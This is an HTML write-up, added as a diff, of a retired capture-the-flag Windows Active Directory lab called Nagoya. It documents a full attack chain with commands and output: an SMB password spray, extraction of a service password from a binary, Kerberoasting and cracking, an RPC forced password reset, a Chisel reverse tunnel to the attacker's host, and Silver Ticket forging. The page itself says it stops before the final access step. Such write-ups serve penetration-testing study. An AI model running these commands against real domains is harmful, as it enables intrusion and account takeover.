@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nagoya &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Nagoya</h1>
+    <div class="meta">Target: <code>192.168.190.21</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">PasswordSpray</span><span class="tag">Kerberoast</span><span class="tag">strings</span><span class="tag">RPC</span><span class="tag">PasswordReset</span><span class="tag">SilverTicket</span><span class="tag">Chisel</span><span class="tag">Tunneling</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#web-enumeration-employee-harvesting">Web Enumeration, Employee Harvesting</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#password-spray-against-smb">Password Spray Against SMB</a><a class="lvl3" href="#sysvol-binary-credential-extraction-with-strings-e-l">SYSVOL Binary, Credential Extraction with strings -e l</a><a class="lvl2" href="#kerberoasting">Kerberoasting</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#rpc-password-reset-evil-winrm-as-christopher-lewis">RPC Password Reset → Evil-WinRM as christopher.lewis</a><a class="lvl3" href="#tunneling-to-internal-mssql-with-chisel">Tunneling to Internal MSSQL with Chisel</a><a class="lvl3" href="#silver-ticket-attack-against-mssql">Silver Ticket Attack Against MSSQL</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Nagoya is a multi-stage Active Directory box that chains credential discovery from a SYSVOL binary, Kerberoasting, RPC-based password reset of a domain user, port-forwarding to reach internal MSSQL, and finally a Silver Ticket attack to impersonate Administrator against the SQL service. The foothold begins with a username list harvested from the company website and a password spray against SMB. Each step requires moving to a different protocol or privilege level, making this an exercise in methodical AD enumeration rather than a single exploit.</p>
+<blockquote>
+<p><strong>Note:</strong> the notes document the Silver Ticket construction and ccache export but cut off before the final MSSQL access with the Administrator ticket and root flag retrieval. Written as in-progress from that point.</p>
+</blockquote>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE           VERSION
+53/tcp   open  domain            Simple DNS Plus
+80/tcp   open  http              Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap              Domain: nagoya-industries.com
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+</code></pre>
+<p>Domain: <code>nagoya-industries.com</code>. Added to <code>/etc/hosts</code>.</p>
+<h3 id="web-enumeration-employee-harvesting">Web Enumeration, Employee Harvesting</h3>
+<p>The IIS site had a <code>/team</code> page listing 28 employees by first and last name. GoBuster found nothing else of interest beyond <code>/error</code>, which leaked an ASP.NET Core development-mode message.</p>
+<p>Formatted into a <code>firstname.lastname</code> username list (28 entries) and saved as <code>names.txt</code>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="password-spray-against-smb">Password Spray Against SMB</h3>
+<p>The list of <code>firstname.lastname</code> usernames was sprayed against SMB using rockyou:</p>
+<pre><code class="language-sh">nxc smb 192.168.190.21 -u names.txt -p /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>One match:</p>
+<pre><code class="language-sh">[+] nagoya-industries.com\Fiona.Clark:Summer2023
+</code></pre>
+<h3 id="sysvol-binary-credential-extraction-with-strings-e-l">SYSVOL Binary, Credential Extraction with <code>strings -e l</code></h3>
+<p>With Fiona's credentials, the SMB shares were listed. SYSVOL contained a <code>Password Reset</code> directory with a binary called <code>ResetPassword.exe</code>. Running standard <code>strings</code> against the binary produced little, the strings were encoded in UTF-16LE (wide characters), which <code>strings</code> skips by default.</p>
+<p>The <code>-e l</code> flag forces little-endian 16-bit string decoding:</p>
+<pre><code class="language-sh">strings -e l ResetPassword.exe
+</code></pre>
+<p>Within the output:</p>
+<pre><code class="language-sh">Password reset successful.
+svc_helpdesk
+U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
+</code></pre>
+<blockquote>
+<p><strong>Why <code>strings -e l</code> matters on Windows binaries:</strong> Windows natively uses UTF-16LE for string literals in many compiled applications. The default <code>strings</code> command only extracts ASCII and misses wide strings entirely. The <code>-e l</code> flag decodes 16-bit little-endian characters, surfacing credentials, URLs, and config values that standard <code>strings</code> would blank out. On Windows targets, always run both.</p>
+</blockquote>
+<p>Credentials so far:</p>
+<pre><code>Fiona.Clark : Summer2023
+svc_helpdesk : U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
+</code></pre>
+<h2 id="kerberoasting">Kerberoasting</h2>
+<p>Both accounts were used to request Kerberoastable tickets:</p>
+<pre><code class="language-sh">impacket-GetUserSPNs nagoya-industries.com/fiona.clark:'Summer2023' \
+  -dc-ip 192.168.214.21 -debug -outputfile kerb.txt
+</code></pre>
+<p>Two hashes returned, one for <code>svc_helpdesk</code> (already owned) and one for <code>svc_mssql</code>. John cracked the <code>svc_mssql</code> ticket almost immediately:</p>
+<pre><code class="language-sh">john kerb.txt
+Service1         (svc_mssql)
+</code></pre>
+<p>Credentials:</p>
+<pre><code>svc_mssql : ‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="rpc-password-reset-evil-winrm-as-christopher-lewis">RPC Password Reset → Evil-WinRM as christopher.lewis</h3>
+<p>Neither Evil-WinRM nor LDAP worked with any discovered account. External MSSQL (1433) was also unreachable. The next angle was RPC enumeration as <code>svc_helpdesk</code>, since helpdesk accounts often have <code>setuserinfo</code> rights over regular users.</p>
+<pre><code class="language-sh">rpcclient -U nagoya-industries/svc_helpdesk 192.168.214.21
+</code></pre>
+<p>Enumeration revealed user <code>christopher.lewis</code> (RID 0x46c) was a member of <code>developers</code> and <code>employees</code> groups. Attempting to reset his password:</p>
+<pre><code class="language-sh">rpcclient $&gt; setuserinfo christopher.lewis 23 '‹redacted›'
+</code></pre>
+<p>No error. Access confirmed:</p>
+<pre><code class="language-sh">evil-winrm -i 192.168.214.21 -u christopher.lewis -p '‹redacted›'
+</code></pre>
+<blockquote>
+<p><strong>Why <code>setuserinfo</code> works from helpdesk accounts:</strong> the <code>setuserinfo</code> RPC call (info level 23 = set password) is controlled by the <code>User-Force-Change-Password</code> extended right in Active Directory. Helpdesk service accounts are commonly granted this right on regular user OUs so they can reset passwords without going through a web portal. If no error is returned, the write succeeded, and you now own the account.</p>
+</blockquote>
+<h3 id="tunneling-to-internal-mssql-with-chisel">Tunneling to Internal MSSQL with Chisel</h3>
+<p>Port 1433 was not externally reachable but was confirmed running internally:</p>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents&gt; netstat -ano | Select-String &quot;1433&quot;
+TCP    0.0.0.0:1433    0.0.0.0:0    LISTENING    2200
+</code></pre>
+<p>Chisel SOCKS tunnel to forward traffic through the WinRM session:</p>
+<pre><code class="language-sh"># Kali
+chisel server -p 8000 --reverse
+
+# Target
+.\chisel.exe client 192.168.45.156:8000 R:socks
+</code></pre>
+<p>MSSQL access via proxychains:</p>
+<pre><code class="language-sh">proxychains ./mssqlclient.py svc_mssql:Service1@127.0.0.1 -windows-auth
+
+SQL (NAGOYA-IND\svc_mssql  guest@master)&gt; select name from master.dbo.sysdatabases;
+master / tempdb / model / msdb
+</code></pre>
+<p>Only default databases. <code>xp_cmdshell</code> was denied, the account lacked <code>sysadmin</code>.</p>
+<h3 id="silver-ticket-attack-against-mssql">Silver Ticket Attack Against MSSQL</h3>
+<p>With the <code>svc_mssql</code> password known and the MSSQL SPN identified, a Silver Ticket was forged to impersonate the Administrator (RID 500) against the SQL service.</p>
+<p>Domain SID retrieved from the WinRM session:</p>
+<pre><code class="language-powershell">Import-Module ActiveDirectory
+Get-ADDomain
+# S-1-5-21-1969309164-1513403977-1686805993
+</code></pre>
+<p>SPN for the MSSQL service:</p>
+<pre><code class="language-powershell">Get-ADUser -Filter {ServicePrincipalName -ne &quot;$null&quot;} -Properties ServicePrincipalName
+# MSSQL/nagoya.nagoya-industries.com
+</code></pre>
+<p>Converting the <code>svc_mssql</code> password to its NTLM hash:</p>
+<pre><code class="language-sh">echo -n 'Service1' | iconv -t UTF-16LE | openssl md4
+# ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>What a Silver Ticket is:</strong> a forged Kerberos TGS (service ticket) crafted offline using the service account's NT hash. Unlike a Golden Ticket (which requires the <code>krbtgt</code> hash), a Silver Ticket only needs the target service account's hash. The ticket claims to be for any user, including Administrator, and the target service validates it using only its own key, never checking with the KDC. This bypasses domain-level monitoring entirely.</p>
+</blockquote>
+<p>Ticket forged with impacket-ticketer:</p>
+<pre><code class="language-sh">impacket-ticketer \
+  -nthash ‹redacted› \
+  -domain-sid S-1-5-21-1969309164-1513403977-1686805993 \
+  -domain nagoya-industries.com \
+  -spn MSSQL/nagoya.nagoya-industries.com \
+  -user-id 500 Administrator
+
+[*] Saving ticket in Administrator.ccache
+</code></pre>
+<p>Exporting the ticket:</p>
+<pre><code class="language-sh">export KRB5CCNAME=Administrator.ccache
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Wide-string <code>strings -e l</code> is mandatory on Windows binaries.</strong> UTF-16LE credentials inside PE files are completely invisible to standard <code>strings</code>. One flag change surfaced a plaintext service account password.</li>
+<li><strong>Helpdesk accounts can force-reset passwords over RPC.</strong> <code>setuserinfo</code> level 23 is a quiet, log-light way to take over domain accounts, no GUI, no ticket, just an RPC call.</li>
+<li><strong>Silver Tickets bypass the KDC entirely.</strong> When you have a service account's NTLM hash and its SPN, you can impersonate any user against that service with no KDC interaction and no domain controller query. Network monitoring sees only local service validation.</li>
+<li><strong>Chisel SOCKS tunnels unlock internally-reachable services.</strong> MSSQL on 1433 was invisible externally; one tunneled connection from an authenticated WinRM session made it reachable from Kali.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
